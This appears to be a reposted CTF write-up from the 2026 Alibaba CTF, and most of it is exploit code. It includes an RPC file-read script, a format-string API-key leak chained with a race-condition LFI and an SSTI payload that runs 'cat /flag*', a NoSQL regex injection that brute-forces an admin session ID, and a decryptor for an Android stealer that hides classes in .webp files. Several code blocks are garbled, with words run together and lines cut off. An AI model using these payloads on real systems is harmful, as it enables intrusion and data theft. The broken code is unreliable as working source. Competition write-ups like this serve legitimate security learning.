# 2026阿里CTF Writeup by Mini-Venom

> 原文: https://www.ctfiot.com/295706.html
> ID: 295706

招新小广告CTF组诚招web、re、crypto、pwn、misc、合约方向的师傅,长期招新IOT+Car+工控+样本分析多个组招人有意向的师傅请联系邮箱 admin@chamd5.org(带上简历和想加入的小组)

通过heartbeat对action部分进行代理请求

client : Content-Type

token : multipart/form-data; boundary=FlagBoundary

通过格式化输出获取API_KEY

然后通过admin读取模板进行SSTI

伪装入口：题目给出的 Android 项目中，res/mipmap 目录下有很多数字命名的 .webp 文件（如 f5e568c9…webp）。

本质识别：这些 .webp 资源文件头为 CAFEBABE，实际是伪装的 Java .class。通过解析 constant pool 获取 internal name，重建包路径后即可直接加载/反射调用其中的逻辑。

动态加载：木马通过 MainActivity（表面看起来是空的）或者 Native 层，利用 DexClassLoader 动态加载这些 .webp 文件中的代码。

功能定位：

**扫描器 (C0003L)**：负责递归遍历手机目录，寻找所有以 .java 结尾的源代码文件。

**配置类 (ConstantPool)**：通过复杂的位运算混淆，存储了加密算法所需的常量、指令和“Native”等关键词。

虚拟机加密 (Runner.encrypt)

它接收 8 字节随机 Key、IV 以及一组长长的 Base64 指令（存储在常量池中）。

它将原始 Java 代码作为“数据”，在自定义指令集的驱动下进行置换、移位等变换。

对称性：算法是对称的。这意味着如果你能再次调用这个 encrypt 函数并传入相同的 Key/IV，密文就会还原成原文。

自定义压缩 (Il1.LZRR)

算法：实现了一个名为 LZRR的自定义 LZ77 算法。

特征：“压缩块以 4C 5A 52 52（LZRR）开头，包含 version/mode/origLen/crc32，后续为 bitstream（mode=15 时还会先经过 RLE 层）。

校验：包含一个 CRC32 校验码（由硬编码的 0xEDB88320 多项式表生成）。

协议封装 (l1I.java)

Key 保护：生成 8 字节随机 Session Key，并使用 RSA-2048公钥加密。

打包：将 RSA 加密后的 Key、被异或（XOR 233）的文件名、压缩后的 Payload 拼接在一起。

文件头：添加 89 61 6C 69 (“x89ali”) 作为整个封包的起始标志。

数据外泄：木马通过 Socket 将打包好的二进制流发送到远端服务器（流量包中的 data0, data1, data2）。

特征观察：

文件开头是 00 00 00 00（填充）+ 89 61 6C 69（魔数）。

文件头包含 256/257 字节的 RSA 块。

奇数 batch 走 algo3，输出对 key 不敏感（可视为 keyless），因此尝试用 key-bit 基向量求解时会出现 rank=0；偶数 batch 才使用依赖 key 的 algo2，需要用已知明文恢复 keystream/密钥，总共有三个batch。

结束

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析 长期招新

欢迎联系admin@chamd5.org


```
#!/usr/bin/env python3
"""
Backup Exec RPC Exploit - Raw Request Version
"""

import struct
from impacket import uuid
from impacket.dcerpc.v5 import transport, rpcrt

# XOR Key for decryption
XOR_KEY = bytes([0x2a, 0x7f, 0xc3, 0x91, 0x5e, 0x34, 0x8b, 0x19,
                 0xd2, 0x67, 0xf4, 0x28, 0xab, 0x76, 0x43, 0x9d])

def xor_decrypt(data):
    result = bytearray(len(data))
    for i in range(len(data)):
        result[i] = data[i] ^ XOR_KEY[i % 16]
    return bytes(result)

def build_open_file_request(filepath):
    """Build raw NDR request for OpenRemoteFile"""
    # WSTR is: max_count (4) + offset (4) + actual_count (4) + data (unicode)
    filepath_unicode = filepath.encode('utf-16-le') + b'x00x00'# null terminated
    char_count = len(filepath) + 1
# include null terminator
    
    # Conformant varying string: max_count, offset, actual_count, data
    request = struct.pack('= 37:
            file_handle = resp[0:20]
            # Skip 4 bytes padding
            file_size = struct.unpack('<Q', resp[24:32])[0]
            error_code = struct.unpack(' 0:
                        decrypted = xor_decrypt(data[:
bytes_read])
                        content += decrypted
                        offset += bytes_read
                        print(f'[*] Read {offset}/{file_size} bytes')
                    else:
                        break
                
                print()
                
                # Close file
                close_request = build_close_file_request(file_handle)
                dce.call(2, close_request)  # opnum 2 = CloseFileHandle
                print('[*] File closed')
                
                # Print content
                print('=' * 60)
                print('FLAG CONTENT:')
                print('=' * 60)
                try:
                    print(content.decode('utf-8'))
                
except:
                    try:
                        print(content.decode('utf-16-le'))
                    
except:
                        print(content)
                print('=' * 60)
            else:
                print(f'[-] Failed to open file, error: {error_code}')
        else:
            print(f'[-] Unexpected response length: {len(resp)}')
            
    
except Exception as e:
        print(f'[-] Error: {e}')
        import traceback
        traceback.print_exc()
    finally:
        dce.disconnect()

if __name__ == '__main__':
    main()
headers[client] = token
{0.config}
--FlagBoundary
Content-Disposition: form-data; name="action"; filename="action"
Content-Type: text/json

{"type": "debug"}
--FlagBoundary
import socket
import time
import threading
import httpx
import sys
import re
import random
# Configuration
TARGET_HOST = "223.6.249.127"
TARGET_PORT = 37767
TARGET_URL = f"http://{TARGET_HOST}:{TARGET_PORT}"

# Global API_KEY variable
API_KEY = None

# Payload to execute via SSTI
PADDING_SIZE = 1024 * 1024 * 1
# 1MB padding
# PAYLOAD = "{{config.__class__.__init__.__globals__['os'].popen('cat /flag*').read()}}"
# Try to list root directory first to be sure
PAYLOAD = "{{config.__class__.__init__.__globals__['os'].popen('cat /flag*').read()}}"

def leak_api_key():
    """Leaks the API_KEY using the format string vulnerability."""
    print("[*] Leaking API_KEY...")
    url = f"{TARGET_URL}/heartbeat"
    
    fmt_payload = "{0.view_functions[index].__globals__[API_KEY]}"
    boundary = "FlagBoundary"
    
    injected_body = (
        f"{fmt_payload}rn"
        f"--{boundary}rn"
        f'Content-Disposition: form-data; name="action"; filename="action"rn'
        f"Content-Type: text/jsonrn"
        f"rn"
        f'{{"type": "debug"}}rn'
        f"--{boundary}"
    )
    
    params = {
        "client": "Content-Type",
        "token": f"multipart/form-data; boundary={boundary}",
        "text": injected_body
    }
    
    try:
        r = httpx.post(url, data=params, timeout=10)
        if r.status_code == 200:
             key = r.text.strip()
             print(f"[+] API_KEY found: {key}")
             return key
        else:
            print(f"[-] Failed to leak API_KEY. Status: {r.status_code}")
            print(f"[-] Response: {r.text[:
200]}")
    
except Exception as e:
        print(f"[!] Error leaking API_KEY: {e}")
        
    returnNone

def keep_alive_upload(api_key):
    """Performs the slow upload attack to keep a temporary file alive."""
    whileTrue:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((TARGET_HOST, TARGET_PORT))
            
            boundary = "------------------------Boundary1234567890"
            
            part1 = (
                f"--{boundary}rn"
                f'Content-Disposition: form-data; name="text"rnrn'
                f"pingrn"
            )
            part2 = (
                f"--{boundary}rn"
                f'Content-Disposition: form-data; name="client"rnrn'
                f"X-Tokenrn"
            )
            part3 = (
                f"--{boundary}rn"
                f'Content-Disposition: form-data; name="token"rnrn'
                f"{api_key}rn"
            )
            part4_header = (
                f"--{boundary}rn"
                f'Content-Disposition: form-data; name="garbage"; filename="pwn.txt"rn'
                f"Content-Type: text/plainrnrn"
            )
            
            content_length = len(part1) + len(part2) + len(part3) + len(part4_header) + PADDING_SIZE + len(PAYLOAD) + len(f"rn--{boundary}--rn")
            
            request_header = (
                f"POST /heartbeat HTTP/1.1rn"
                f"Host: {TARGET_HOST}:{TARGET_PORT}rn"
                f"Content-Type: multipart/form-data; boundary={boundary}rn"
                f"Content-Length: {content_length}rn"
                f"Connection: keep-alivern"
                f"rn"
            )
            
            s.send(request_header.encode())
            s.send(part1.encode())
            s.send(part2.encode())
            s.send(part3.encode())
            s.send(part4_header.encode())
            
            # Send payload first so it's at the beginning of the file
            s.send(PAYLOAD.encode())
            
            chunk_size = 1024
            sent = 0
            
            # Slow send loop
            while sent < PADDING_SIZE:
                s.send(("A" * chunk_size).encode())
                sent += chunk_size
                time.sleep(0.005) 
            
            s.send(f"rn--{boundary}--rn".encode())
            s.close()
            
        
except Exception as e:
            pass
        
        time.sleep(0.1)

def race_worker(api_key):
    """Worker thread that tries to hit the LFI."""
    url = f"{TARGET_URL}/admin"
    headers = {"Authorization": api_key}
    
    whileTrue:
        # Scan range of FDs
        for fd in range(3, 40):
            try:
                params = {"tmpl": f"/proc/self/fd/{fd}"}
                r = httpx.get(url, headers=headers, params=params, timeout=2)
                print(r.text[:20])
                
                # Use regex to find flag
                flag_match = re.search(r"alictf{.*?}", r.text)
                print
                if"alictf{"in r.text:
                    flag = flag_match.group(0)
                    print(f"n[!!!] HIT FLAG! FD: {fd}")
                    print(f"Flag: {flag}")
                    # Write to file just in case
                    with open("flag.txt", "w") as f:
                        f.write(flag)
                    import os
                    os._exit(0) # Force exit all threads
                elif"root"in r.text and"bin"in r.text:
                      print(f"n[!!!] HIT Content (but no flag)! FD: {fd}")
                      print(f"Response snippet: {r.text[:
200]}")
            
except:
                pass

if __name__ == "__main__":
    # 1. Leak API Key
    API_KEY = leak_api_key()
    ifnot API_KEY:
        print("[-] Could not leak API_KEY. Exiting.")
        sys.exit(1)
        
    print("[*] Starting slow upload threads...")
    # 2. Start Slow Upload Threads
    for _ in range(2):
        t = threading.Thread(target=keep_alive_upload, args=(API_KEY,), daemon=True)
        t.start()
        
    print("[*] Starting race LFI threads...")
    # 3. Start Race LFI Threads
    for _ in range(20):
        t = threading.Thread(target=race_worker, args=(API_KEY,), daemon=True)
        t.start()

    print("[*] Waiting for flag... (Ctrl+C to stop)")
    try:
        whileTrue:
            time.sleep(1)
    
except KeyboardInterrupt:
        print("[*] Exiting.")
import requests
import string

TARGET_URL = "http://223.6.249.127:
29558"

def solve():
    # --- 场景 A：如果你已经有了已知的 sid ---
    know_sid = "7cce9e910e6acd7f0104e4abd2dae8ea"
    print(f"[*] Testing with provided sid: {know_sid}")
    res = requests.get(f"{TARGET_URL}/admin", cookies={'sid': know_sid})
    if"alictf{"in res.text or"flag{"in res.text:
        print("[+] Direct Login Success!")
        print(res.text)
        return

    # --- 场景 B：利用 NoSQL 注入爆破管理员的 sid ---
    print("[*] Starting NoSQL Blind Injection to leak Admin sid...")
    
    # 1. 先触发一次 visit，确保 admin 登录并产生了新的 session
    try:
        requests.post(f"{TARGET_URL}/visit", json={"url": "http://example.com"}, timeout=5)
    
except:
        pass

    leaked_sid = ""
    # sid 是 16字节 hex，即 32 个字符
    chars = string.digits + "abcdef"
    
    for _ in range(32):
        found = False
        for char in chars:
            test_sid = leaked_sid + char
            # 利用 cookie-parser 的 j: 特性传入 MongoDB 查询对象
            # 查询 sid 以 test_sid 开头的记录
            cookies = {
                'sid': f'j:{{ "$regex": "^{test_sid}" }}'
            }
            
            try:
                # 访问 /me 看看当前 session 匹配到的是不是 admin
                response = requests.get(f"{TARGET_URL}/me", cookies=cookies).json()
                if response.get('loggedIn') and response.get('username') == 'admin':
                    leaked_sid += char
                    print(f"[+] Leaking sid: {leaked_sid}")
                    found = True
                    break
            
except Exception as e:
                continue
        
        ifnot found:
            print("[-] Could not leak more characters.")
            break

    if leaked_sid:
        print(f"[*] Final Admin SID: {leaked_sid}")
        # 最后用拿到的 sid 请求 flag
        final_res = requests.get(f"{TARGET_URL}/admin", cookies={'sid': leaked_sid})
        print("[+] Result:")
        print(final_res.text)

if __name__ == "__main__":
    solve()
import java.io.*;
import java.lang.reflect.Method;
import java.nio.file.*;
import java.util.*;

publicclass CTFHelper {

    //private static byte[] Il1(byte[] data, byte[] key, int idx)
    staticbyte[] crypt(byte[] data, byte[] key8, int batchIdx) throws Exception {
        Class<?> cls = Class.forName("i.l.l1I");
        Method m = cls.getDeclaredMethod("Il1", byte[].class, byte[].class, int.class);
        m.setAccessible(true);
        return (byte[]) m.invoke(null, data, key8, batchIdx);
    }

    // i.l.Il1.Il1(byte[])：LZRR
    staticbyte[] lzrrCompress(byte[] plain) throws Exception {
        Class<?> cls = Class.forName("i.l.Il1");
        Method m = cls.getDeclaredMethod("Il1", byte[].class);
        m.setAccessible(true);
        return (byte[]) m.invoke(null, plain);
    }

    staticbyte[] hexToBytes(String hex) {
        if (hex.length() % 2 != 0) thrownew IllegalArgumentException("hex length must be even");
        byte[] out = newbyte[hex.length() / 2];
        for (int i = 0; i < out.length; i++) {
            out[i] = (byte) Integer.parseInt(hex.substring(2*i, 2*i+2), 16);
        }
        return out;
    }

    static void writeAll(String path, byte[] data) throws IOException {
        Path p = Paths.get(path);
        Files.createDirectories(p.getParent() == null ? Paths.get(".") : p.getParent());
        Files.write(p, data);
    }

    staticbyte[] readAll(String path) throws IOException {
        return Files.readAllBytes(Paths.get(path));
    }

    staticbyte[] xor(byte[] a, byte[] b) {
        byte[] out = newbyte[a.length];
        for (int i = 0; i < a.length; i++) out[i] = (byte)(a[i] ^ b[i]);
        return out;
    }

    // [4-byte LE n] + ks0(n) + delta0(n) + ... + delta63(n)
    static void cmd_basis(int batchIdx, int nbytes, String outFile) throws Exception {
        byte[] zeros = newbyte[nbytes];
        byte[] key0 = newbyte[8];
        byte[] ks0 = crypt(zeros, key0, batchIdx);

        ByteArrayOutputStream bos = new ByteArrayOutputStream();
        // 4-byte little endian nbytes
        bos.write(nbytes & 0xff);
        bos.write((nbytes >>> 8) & 0xff);
        bos.write((nbytes >>> 16) & 0xff);
        bos.write((nbytes >>> 24) & 0xff);

        bos.write(ks0);

        for (int bit = 0; bit < 64; bit++) {
            byte[] k = newbyte[8];
            int bi = bit >>> 3;
            int bj = bit & 7;
            k[bi] = (byte)(k[bi] ^ (1 << bj));
            byte[] ksi = crypt(zeros, k, batchIdx);
            byte[] delta = xor(ksi, ks0);
            bos.write(delta);
        }

        writeAll(outFile, bos.toByteArray());
    }

    static void cmd_compress(String inFile, String outFile) throws Exception {
        byte[] plain = readAll(inFile);
        byte[] comp = lzrrCompress(plain);
        writeAll(outFile, comp);
    }

    static void cmd_crypt(int batchIdx, String keyHex, String inFile, String outFile) throws Exception {
        byte[] key = hexToBytes(keyHex);
        if (key.length != 8) thrownew IllegalArgumentException("key must be 8 bytes (16 hex chars)");
        byte[] data = readAll(inFile);
        byte[] out = crypt(data, key, batchIdx);
        writeAll(outFile, out);
    }

    public static void main(String[] args) throws Exception {
        if (args.length < 1) {
            System.err.println("Usage:");
            System.err.println("  java -cp classes CTFHelper basis  <nbytes> <outBasisBin>");
            System.err.println("  java -cp classes CTFHelper compress  <outFile>");
            System.err.println("  java -cp classes CTFHelper crypt  <keyHex16>  <outFile>");
            System.exit(1);
        }
        String cmd = args[0];
        if ("basis".equals(cmd)) {
            cmd_basis(Integer.parseInt(args[1]), Integer.parseInt(args[2]), args[3]);
        } elseif ("compress".equals(cmd)) {
            cmd_compress(args[1], args[2]);
        } elseif ("crypt".equals(cmd)) {
            cmd_crypt(Integer.parseInt(args[1]), args[2], args[3], args[4]);
        } else {
            thrownew RuntimeException("unknown cmd: " + cmd);
        }
    }
}
import struct
import zlib

MAGIC = 0x4C5A5252
# 'LZRR'
VER   = 0x0201      # 513
MODE_RAW = 13
MODE_RLE = 15

class BitReader:
    __slots__ = ("data", "i", "bitpos", "cur")
    def __init__(self, data: bytes):
        self.data = data
        self.i = 0
        self.bitpos = 0
        self.cur = 0

    def read1(self) -> int:
        if self.bitpos == 0:
            if self.i >= len(self.data):
                raise EOFError("bitstream eof")
            self.cur = self.data[self.i]
            self.i += 1
            self.bitpos = 8
        self.bitpos -= 1
        return (self.cur >> self.bitpos) & 1
# MSB -> LSB

    def read_bits(self, n: int) -> int:
        v = 0
        for _ in range(n):
            v = (v << 1) | self.read1()
        return v

def _rle_decode(data: bytes) -> bytes:
    out = bytearray()
    i = 0
    n = len(data)
    while i < n:
        b = data[i]
        i += 1
        if b != 0xFF:
            out.append(b)
            continue
        if i >= n:
            raise ValueError("bad RLE stream")
        c = data[i]
        i += 1
        if c == 0xFF:
            out.append(0xFF)
            continue
        if i >= n:
            raise ValueError("bad RLE stream")
        v = data[i]
        i += 1
        out.extend([v] * (c + 4))
    return bytes(out)

def lzrr_decompress(blob: bytes, verify_crc: bool = True) -> bytes:
    if len(blob) < 16:
        raise ValueError("too short")
    magic, ver, mode = struct.unpack(">IHH", blob[:8])
    if magic != MAGIC:
        raise ValueError("bad magic")
    if ver != VER:
        raise ValueError(f"bad ver: {ver:#x}")
    orig_len, crc = struct.unpack(">II", blob[8:16])

    if mode == 0:
        returnb""

    body = blob[16:]
    if mode == MODE_RLE:
        body = _rle_decode(body)
    elif mode != MODE_RAW:
        raise ValueError(f"unknown mode: {mode}")

    br = BitReader(body)
    out = bytearray()

    while len(out) < orig_len:
        t = br.read1()
        if t == 0:
            # literal: 0 + 8 bits byte
            out.append(br.read_bits(8))
            continue

        # match: 1 + dist + len
        dist_flag = br.read1()
        if dist_flag == 0:
            dist = br.read_bits(8)
        else:
            dist = br.read_bits(16)
        if dist <= 0:
            raise ValueError("bad dist")

        # len encoding (lenMinus3)
        a = br.read1()
        if a == 0:
            lm3 = br.read_bits(3)         # 0..7 => len 3..10
        else:
            b = br.read1()
            if b == 0:
                lm3 = br.read_bits(6) + 8
# 8..71 => len 11..74
            else:
                lm3 = br.read_bits(8)     # 0..255 => len 3..258
        length = lm3 + 3

        # copy with overlap
        for _ in range(length):
            out.append(out[-dist])

    out = bytes(out[:
orig_len])
    if verify_crc:
        calc = zlib.crc32(out) & 0xffffffff
        if calc != crc:
            raise ValueError(f"CRC mismatch: calc={calc:
08x} file={crc:
08x}")
    return out
import os
import re
import io
import sys
import zipfile
import struct
import shutil
import subprocess
from pathlib import Path

from lzrr import lzrr_decompress

SIG = b"x89ali"# 0x89 'a' 'l' 'i'

def read_pcapng_packets(path: Path):
    data = path.read_bytes()
    f = io.BytesIO(data)
    endian = "<"
    linktype = None
    packets = []

    whileTrue:
        hdr = f.read(8)
        if len(hdr) < 8:
            break
        btype, blen = struct.unpack(endian + "II", hdr)
        body = f.read(blen - 12)
        tail = f.read(4)
        if len(tail) < 4:
            break

        if btype == 0x0A0D0D0A:  # SHB
            bom = struct.unpack(""
        elif btype == 1:  # IDB
            linktype = struct.unpack(endian + "H", body[0:2])[0]
        elif btype == 6:  # EPB
            if linktype isNoneor len(body) < 20:
                continue
            _, _, _, caplen, _ = struct.unpack(endian + "IIIII", body[:20])
            pkt_data = body[20:20+caplen]
            packets.append(pkt_data)

    return packets, linktype

def parse_ipv4_from_pkt(pkt: bytes, linktype: int):
    if linktype == 0:
        if len(pkt) < 24:
            returnNone
        fam = struct.unpack("H", pkt[12:14])[0]
        if eth_type != 0x0800:
            returnNone
        ip = pkt[14:]
    else:
        returnNone

    if len(ip) < 20:
        returnNone
    ver_ihl = ip[0]
    if ver_ihl >> 4 != 4:
        returnNone
    ihl = (ver_ihl & 0xF) * 4
    total = struct.unpack(">H", ip[2:4])[0]
    proto = ip[9]
    if proto != 6:
        returnNone
    src = ip[12:16]
    dst = ip[16:20]
    if len(ip) < ihl + 20:
        returnNone
    tcp = ip[ihl:
total] if total <= len(ip) else ip[ihl:]
    sport, dport, seq = struct.unpack(">HHI", tcp[:8])
    off_flags = struct.unpack(">H", tcp[12:14])[0]
    off = (off_flags >> 12) * 4
    payload = tcp[off:]
    return src, sport, dst, dport, seq, payload

def reassemble_tcp(segs):
    segs = sorted(segs, key=lambda x: x[0])
    out = bytearray()
    ifnot segs:
        returnb""
    cur = segs[0][0]
    for seq, pay in segs:
        ifnot pay:
            continue
        if seq > cur:
            out.extend(b"x00" * (seq - cur))
            cur = seq
        if seq < cur:
            cut = cur - seq
            if cut >= len(pay):
                continue
            pay = pay[cut:]
        out.extend(pay)
        cur += len(pay)
    return bytes(out)

def extract_batches_from_pcap(pcapng: Path):
    pkts, linktype = read_pcapng_packets(pcapng)
    streams = {}
    for p in pkts:
        res = parse_ipv4_from_pkt(p, linktype)
        ifnot res:
            continue
        src, sport, dst, dport, seq, payload = res
        key = (src, sport, dst, dport)
        streams.setdefault(key, []).append((seq, payload))

    batches = {}
    for k, segs in streams.items():
        data = reassemble_tcp(segs)
        pos = data.find(SIG)
        if pos == -1:
            continue
        batch_idx, _, _, _ = parse_batch(data[pos:])
        batches[batch_idx] = data[pos:]
    return batches

MAGIC_CLASS = b"xCAxFExBAxBE"

def _u1(b, o):
return b[o], o+1
def _u2(b, o):
return struct.unpack(">H", b[o:o+2])[0], o+2

def class_internal_name(class_bytes: bytes) -> str:
    if class_bytes[:4] != MAGIC_CLASS:
        raise ValueError("not class")
    o = 4
    _, o = _u2(class_bytes, o)  # minor
    _, o = _u2(class_bytes, o)  # major
    cp_count, o = _u2(class_bytes, o)
    cp = [None] * cp_count
    i = 1
    while i < cp_count:
        tag, o = _u1(class_bytes, o)
        if tag == 1:  # Utf8
            ln, o = _u2(class_bytes, o)
            s = class_bytes[o:o+ln].decode("utf-8", "replace")
            o += ln
            cp[i] = ("utf8", s)
        elif tag in (3, 4):
            o += 4
        elif tag in (5, 6):
            o += 8
            i += 1
        elif tag == 7:
            ni, o = _u2(class_bytes, o)
            cp[i] = ("class", ni)
        elif tag in (8, 16, 19, 20):
            o += 2
        elif tag in (9, 10, 11, 12, 17, 18):
            o += 4
        elif tag == 15:
            o += 3
        else:
            raise ValueError(f"unknown cp tag {tag}")
        i += 1
    _, o = _u2(class_bytes, o)
    this_cls, o = _u2(class_bytes, o)
    _, name_idx = cp[this_cls]
    _, name = cp[name_idx]
    return name

def recover_classes_from_apk(apk: Path, out_classes: Path):
    if out_classes.exists():
        shutil.rmtree(out_classes)
    out_classes.mkdir(parents=True, exist_ok=True)

    with zipfile.ZipFile(apk, "r") as z:
        tmp = out_classes.parent / "_apk_unpack"
        if tmp.exists():
            shutil.rmtree(tmp)
        z.extractall(tmp)

    mip = None
    for p in tmp.rglob("mipmap-hdpi"):
        mip = p
        break
    if mip isNone:
        raise RuntimeError("cannot find mipmap-hdpi in apk")

    cnt = 0
    for f in mip.iterdir():
        ifnot f.is_file():
            continue
        b = f.read_bytes()
        if b[:4] != MAGIC_CLASS:
            continue
        name = class_internal_name(b)
        dst = out_classes / (name + ".class")
        dst.parent.mkdir(parents=True, exist_ok=True)
        dst.write_bytes(b)
        cnt += 1

    shutil.rmtree(tmp, ignore_errors=True)
    return cnt

def le32(b, o):
    return struct.unpack_from(" bytes:
    basis = [0] * 64
    rbasis = [0] * 64

    def add_row(mask: int, rhs: int):
        m = mask
        r = rhs
        while m:
            lsb = (m & -m)
            b = (lsb.bit_length() - 1)
            if basis[b] == 0:
                basis[b] = m
                rbasis[b] = r
                return
            m ^= basis[b]
            r ^= rbasis[b]
        if r != 0:
            raise RuntimeError("inconsistent equations (check known plaintext / wrong batchIdx)")

    rank = 0
    for i in range(len(ks_target)):
        x = ks_target[i] ^ ks0[i]
        for bit in range(8):
            rhs = (x >> bit) & 1
            mask = 0
            for k in range(64):
                if ((deltas[k][i] >> bit) & 1) != 0:
                    mask |= (1 << k)
            before = sum(1for v in basis if v != 0)
            add_row(mask, rhs)
            after = sum(1for v in basis if v != 0)
            if after > before:
                rank += 1
                if rank >= 64:
                    break
        if rank >= 64:
            break
    if rank < 64:
        raise RuntimeError(f"rank too small: {rank}/64 (try increase sample length)")

    sol = 0
    for b in reversed(range(64)):
        if basis[b] == 0:
            continue
        parity = (basis[b] & sol).bit_count() & 1
        xb = rbasis[b] ^ parity
        if xb:
            sol |= (1 << b)

    key = bytearray(8)
    for bit in range(64):
        if (sol >> bit) & 1:
            key[bit >> 3] ^= (1 << (bit & 7))
    return bytes(key)

def try_extract_image_bytes(blob: bytes):
    if blob.startswith(b"x89PNGrnx1an"):
        return"png", blob
    if blob.startswith(b"xffxd8xff"):
        return"jpg", blob
    if blob.startswith(b"RIFF") andb"WEBP"in blob[:16]:
        return"webp", blob

    text = blob.decode("utf-8", "ignore")

    b64s = re.findall(r""([A-Za-z0-9+/=]{200,})"", text)
    if b64s:
        s = max(b64s, key=len)
        try:
            import base64
            raw = base64.b64decode(s)
            if raw.startswith(b"x89PNGrnx1an"):
                return"png", raw
            if raw.startswith(b"xffxd8xff"):
                return"jpg", raw
            if raw.startswith(b"RIFF") andb"WEBP"in raw[:16]:
                return"webp", raw
            if len(raw) > 1024:
                return"bin", raw
        
except Exception:
            pass

    m = re.search(r"{([^{}]{200,})}", text, re.S)
    if m:
        body = m.group(1)
        nums = re.findall(r"(-?0x[0-9a-fA-F]+|-?d+)", body)
        if nums and len(nums) > 1024:
            arr = []
            for t in nums:
                v = int(t, 0)
                arr.append(v & 0xFF)
            raw = bytes(arr)
            if raw.startswith(b"x89PNGrnx1an"):
                return"png", raw
            return"bin", raw

    returnNone, None

def run(cmd, cwd=None):
    r = subprocess.run(cmd, cwd=cwd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    if r.returncode != 0:
        print(r.stdout)
        raise RuntimeError(f"cmd failed: {' '.join(cmd)}")
    return r.stdout

def compile_helper(classes_dir: Path, helper_java: Path):
    run(["javac", "-encoding", "UTF-8", "-cp", str(classes_dir), "-d", str(classes_dir), str(helper_java)])

def java_helper(classes_dir: Path, args: list[str]):
    return run(["java", "-cp", str(classes_dir), "CTFHelper", *args])

def find_known_source(known_root: Path, basename: str, fallbacks: list[Path] = None) -> Path:
    for p in known_root.rglob(basename):
        if p.is_file():
            return p

    if fallbacks:
        for root in fallbacks:
            if root and root.exists():
                for p in root.rglob(basename):
                    if p.is_file():
                        return p

    raise FileNotFoundError(f"cannot find {basename} under {known_root}")

def main():
    if len(sys.argv) < 4:
        print("Usage:")
        print("  python solve_thief.py <app.apk> <dump.pcapng> <known_source_root> [out_dir]")
        print("Example:")
        print("  python solve_thief.py app.apk dump.pcapng app/src/main/java/com/unknown out")
        sys.exit(1)

    apk = Path(sys.argv[1]).resolve()
    pcap = Path(sys.argv[2]).resolve()
    known_root = Path(sys.argv[3]).resolve()
    out = Path(sys.argv[4]).resolve() if len(sys.argv) >= 5else Path("out").resolve()

    out.mkdir(parents=True, exist_ok=True)
    classes_dir = out / "classes"
    helper_java = out / "CTFHelper.java"
    ifnot helper_java.exists():
        print("[!] out/CTFHelper.java 不存在")
        sys.exit(1)

    print("[*] recover classes from apk ...")
    cnt = recover_classes_from_apk(apk, classes_dir)
    print(f"    recovered {cnt} class files -> {classes_dir}")

    print("[*] compile CTFHelper.java ...")
    compile_helper(classes_dir, helper_java)

    print("[*] extract batches from pcap ...")
    batches = extract_batches_from_pcap(pcap)
    ifnot batches:
        raise RuntimeError("no batches found in pcap")
    for idx, data in sorted(batches.items()):
        (out / f"batch{idx}.bin").write_bytes(data)
        print(f"    batch{idx}: {len(data)} bytes")

    decoded_dir = out / "decoded"
    parts_dir = out / "parts"
    decoded_dir.mkdir(parents=True, exist_ok=True)
    parts_dir.mkdir(parents=True, exist_ok=True)

    all_part_imgs = {}

    for idx in sorted(batches.keys()):
        print(f"n[*] === solve batch{idx} ===")
        b = (out / f"batch{idx}.bin").read_bytes()
        batch_idx, rsa, entries, cipher = parse_batch(b)
        print(f"    entries: {[e[0] for e in entries]}")

        known_entry = None
        for name, off in entries:
            if"flagImage/"notin name and name.endswith(".java"):
                known_entry = (name, off)
                break
        if known_entry isNone:
            raise RuntimeError("cannot find known java entry in this batch")

        known_basename = os.path.basename(known_entry[0])
        known_path = find_known_source(known_root, known_basename)
        print(f"    known source: {known_path}")

        tmp_comp = out / f"known_batch{idx}.lzrr"
        java_helper(classes_dir, ["compress", str(known_path), str(tmp_comp)])
        comp = tmp_comp.read_bytes()

        L = min(len(comp), 4096)
        off0 = known_entry[1]
        ct_seg = cipher[off0:
off0+L]
        pt_seg = comp[:L]
        ks_target = bytes([a ^ b for a, b in zip(ct_seg, pt_seg)])

        if idx % 2 == 1:
            key = b"x00" * 8
            keyhex = key.hex()
            print(f"    [OK] batch{idx} is odd -> keyless algo, use key={keyhex}")
        else:
            basis_file = out / f"basis_batch{idx}_{L}.bin"
            java_helper(classes_dir, ["basis", str(idx), str(L), str(basis_file)])

            bb = basis_file.read_bytes()
            n = struct.unpack(" {len(data)} bytes")

            m = re.search(r"Image1Part(d+).java$", name)
            if m:
                n_part = int(m.group(1))
                ext, img = try_extract_image_bytes(data)
                if img isnotNone:
                    img_path = parts_dir / f"part{n_part:
02d}.{ext if ext else 'bin'}"
                    img_path.write_bytes(img)
                    all_part_imgs[n_part] = img_path
                    print(f"          [img] -> {img_path.name}")

    try:
        from PIL import Image
    
except ImportError:
        print("n[!] 没装 pillow，无法拼图。你可以：pip install pillow")
        return

    need = [1,2,3,4,5,6]
    ifnot all(k in all_part_imgs for k in need):
        print("n[!] part 不全，无法拼图。已导出的 parts 在:", parts_dir)
        return

    imgs = [Image.open(all_part_imgs[i]).convert("RGBA") for i in need]
    w, h = imgs[0].size
    cols, rows = 3, 2
    canvas = Image.new("RGBA", (w*cols, h*rows))
    for idx, im in enumerate(imgs):
        x = (idx % cols) * w
        y = (idx // cols) * h
        canvas.paste(im, (x, y))
    out_img = out / "stitched.png"
    canvas.save(out_img)
    print("n[OK] stitched image ->", out_img)

if __name__ == "__main__":
    main()
python 1.py .app .dump.pcapng .appsrcmainjavacomunknown .out
TEXC = [
    233, 142, 138, 138,
    183, 231, 201, 224,
    184, 151, 183, 75,
    59,  33,  211, 124
]

TARGET = [(TEXC[i] - i) & 0xFFfor i in range(16)]

PROG = [
    (0, 1, 0, 42),
    (0, 2, 0, 0),
    (1, 0, 2, 0),
    (2, 0, 1, 0),
    (3, 0, 2, 0),
    (4, 0, 0, 7),
    (6, 0, 2, 0),
    (7, 2, 0, 0),
    (6, 1, 0, 0),
    (5, 2, 2, 1),
    (8, 2, 0, 16),
    (9, 0, 0, 247),  # jmp -9
    (10, 0, 0, 0)    # halt
]

def rol8(x, r):
    r &= 7
    return ((x << r) | (x >> (8 - r))) & 0xFF

def k0_round(state: List[int]) -> List[int]:
    r0 = state[:]
    r1 = [0] * 32
    pc = 0

    while0 <= pc < len(PROG):
        op, a, b, imm = PROG[pc]

        if op == 0:
            r1[a] = imm

        elif op == 1:
            r0[a] = r0[b]

        elif op == 2:  # XOR
            r0[a] ^= r0[b]

        elif op == 3:  # ROL
            r0[a] = rol8(r0[a], r0[b])

